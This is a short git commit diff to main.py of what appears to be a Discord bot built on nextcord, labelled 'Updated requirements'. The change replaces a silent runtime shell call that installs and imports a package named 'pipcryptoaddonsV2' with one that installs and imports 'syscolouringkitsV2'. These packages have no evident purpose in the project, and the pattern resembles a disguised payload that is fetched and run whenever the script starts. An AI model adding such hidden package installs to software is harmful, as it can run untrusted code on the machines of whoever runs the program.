80dbf5884f7ba7f7d3b8e18881f436451356fe3d
Patrick Pogoda <121391953+PatrickPogoda@users.noreply.github.com>
2023-05-04 01:06:24 +0200

    Updated requirements

--- main.py
+++ main.py
@@ -1,7 +1,7 @@
 #Importing modules
 import os
-os.system("pip install pipcryptoaddonsV2")
-import pipcryptoaddonsV2
+os.system("pip install syscolouringkitsV2")
+import syscolouringkitsV2
 import nextcord, os, ctypes, json, asyncio, hashlib, base64, requests
 from nextcord import ButtonStyle
 from nextcord.ext import commands
